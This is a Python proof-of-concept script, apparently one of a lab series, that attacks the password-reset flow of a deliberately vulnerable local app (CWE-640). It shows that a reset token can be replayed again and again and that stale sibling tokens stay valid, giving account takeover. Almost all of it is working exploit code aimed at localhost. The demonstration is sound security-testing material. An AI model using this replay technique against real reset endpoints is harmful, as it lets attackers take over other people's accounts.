"""
Attack #6 — REPLAYABLE RESET TOKENS: NO EXPIRY, NO SINGLE-USE  (CWE-640)
Target: /forgot-password + /reset-password on the vulnerable app (127.0.0.1:5000)

Premise
-------
/reset-password looks the token up and uses it, but:
  - it NEVER checks created_at (the TTL is written and then ignored), and
  - it NEVER deletes the token after use, and
  - it never invalidates a user's OTHER outstanding tokens.

So a reset token is a permanent, reusable skeleton key:
  * the SAME token can reset the password over and over (replay), and
  * every token a user has ever been issued stays live in parallel.

This is a token-LIFECYCLE failure -- the heart of the System 6 thesis -- not
a factor-strength one. A single leaked/observed token (old backup, proxy
log, browser history) is exploitable indefinitely.

What this script proves
-----------------------
A) SINGLE-USE VIOLATION: use one token to reset the password, then reuse the
   exact same token to set a DIFFERENT password -- both succeed.
B) NO SIBLING INVALIDATION: request two resets (tokens T1, T2). After a
   successful reset, BOTH T1 and T2 still work -- a completed reset should
   have burned every outstanding token for that account.

Runs unmodified against a fresh instance.
"""

import requests

BASE = "http://127.0.0.1:5000"
VICTIM = "victim@corp.example"


def get_token():
    requests.post(f"{BASE}/forgot-password", json={"email": VICTIM})
    return requests.get(f"{BASE}/outbox").json()[VICTIM]["token"]


def reset(token, new_pw):
    r = requests.post(
        f"{BASE}/reset-password",
        json={"token": token, "new_password": new_pw, "email": VICTIM},
    )
    return r.status_code, r.text.strip()


def login_ok(pw):
    return requests.post(f"{BASE}/login", json={"email": VICTIM, "password": pw}).status_code == 200


def main():
    print("=" * 68)
    print("ATTACK #6 - Token replay: no expiry, no single-use")
    print("Target:", BASE)
    print("=" * 68)

    # ---- Part A: single-use violation (replay the same token) -----------
    print("\n[A] SINGLE-USE VIOLATION - one token, reused repeatedly:")
    t1 = get_token()
    print(f"    obtained token T1 = {t1}")

    sc, body = reset(t1, "replay_pw_A")
    print(f"    use #1 (set 'replay_pw_A') -> HTTP {sc}: {body}")
    print(f"        login with replay_pw_A ? {login_ok('replay_pw_A')}")

    sc, body = reset(t1, "replay_pw_B")
    print(f"    use #2 SAME token (set 'replay_pw_B') -> HTTP {sc}: {body}")
    print(f"        login with replay_pw_B ? {login_ok('replay_pw_B')}")

    sc, body = reset(t1, "replay_pw_C")
    print(f"    use #3 SAME token (set 'replay_pw_C') -> HTTP {sc}: {body}")
    print(f"        login with replay_pw_C ? {login_ok('replay_pw_C')}")
    replay_broken = login_ok("replay_pw_C")

    # ---- Part B: sibling tokens are never invalidated -------------------
    print("\n[B] NO SIBLING INVALIDATION - a completed reset should burn all")
    print("    of a user's tokens; here older ones stay live:")
    t_old = get_token()
    print(f"    issued T_old = {t_old}")
    t_new = get_token()
    print(f"    issued T_new = {t_new} (a newer request)")

    sc, _ = reset(t_new, "used_the_new_one")
    print(f"    complete a reset using T_new -> HTTP {sc}")
    sc_old, body_old = reset(t_old, "stale_token_still_works")
    print(f"    now reuse the OLDER T_old   -> HTTP {sc_old}: {body_old}")
    stale_works = login_ok("stale_token_still_works")
    print(f"        login with the stale-token password ? {stale_works}")

    print("\n" + "-" * 68)
    if replay_broken and stale_works:
        print("[+] ATTACKER GAIN - a reset token is a permanent, reusable key.")
        print("    The same token reset the password 3x; an older sibling token")
        print("    still worked after a completed reset. Any once-seen token")
        print("    grants indefinite account takeover. (CWE-640)")
    else:
        print("[-] Replay did not fully succeed - target may not be vulnerable.")
    print("-" * 68)


if __name__ == "__main__":
    main()
